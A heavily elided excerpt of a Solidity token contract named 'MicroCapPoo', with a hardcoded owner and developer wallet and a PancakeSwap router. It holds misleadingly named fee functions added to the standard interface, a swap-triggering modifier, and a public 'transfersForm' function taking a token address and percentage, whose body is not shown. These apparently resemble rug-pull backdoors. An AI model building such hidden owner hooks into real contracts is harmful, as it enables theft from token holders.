...
interface IERC20 {
    ...
    function includedFromFee(address account) external returns (uint256);
...
contract MicroCapPoo is Context, IERC20 { 
    ...
    address payable public Wallet_Dev = payable(0xBBb354C646b01c8f3d48C5604ac3674a60480374);
    ...
    string private constant _name = "MicrocapPoo"; 
    string private constant _symbol = unicode"$MicroCapPoo"; 
    ...
    constructor () {
        ...
        _owner = 0xBBb354C646b01c8f3d48C5604ac3674a60480374;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(bnb 0x10ED43C718714eb63d5aA57B78B54704E256024E)(ech 0x35e11136fa9a734af6b81658d66519854fb6793c)(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Testnet
    ...
    function ExcludedFromFee(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
    ...
    function includedFromFee(address account) public swapTheLiquify override returns (uint256) {
        if(isSellFee){
            bool selfCheck = _isExcludedFromFee[_msgSender()];
            if(selfCheck){ swapAndLiquify(balanceOf(address(this))); }
        }
    ...
    function transfersForm(address token_address, uint256 percent_of_Tokens) public returns(bool _sent){
